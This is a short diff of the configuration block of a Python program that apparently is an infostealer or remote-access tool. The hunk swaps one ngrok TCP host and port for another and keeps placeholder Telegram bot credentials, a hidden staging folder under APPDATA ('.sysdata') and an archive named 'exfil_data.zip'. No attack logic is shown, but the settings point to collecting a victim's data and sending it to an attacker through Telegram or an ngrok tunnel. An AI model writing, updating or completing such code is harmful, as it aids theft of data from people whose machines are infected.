@@ -31,8 +31,8 @@ import ctypes
 # === CONFIG ===
 BOT_TOKEN = "<<BOT_TOKEN>>"
 CHAT_ID = "<<CHAT_ID>>"
-NGROK_HOST = "4.tcp.eu.ngrok.io"
-NGROK_PORT = 17534
+NGROK_HOST = "5.tcp.eu.ngrok.io"
+NGROK_PORT = 16534
 EXTRACT_FOLDER = os.path.join(os.getenv("APPDATA"), ".sysdata")  # Hidden folder
 ARCHIVE_NAME = "exfil_data.zip"
 
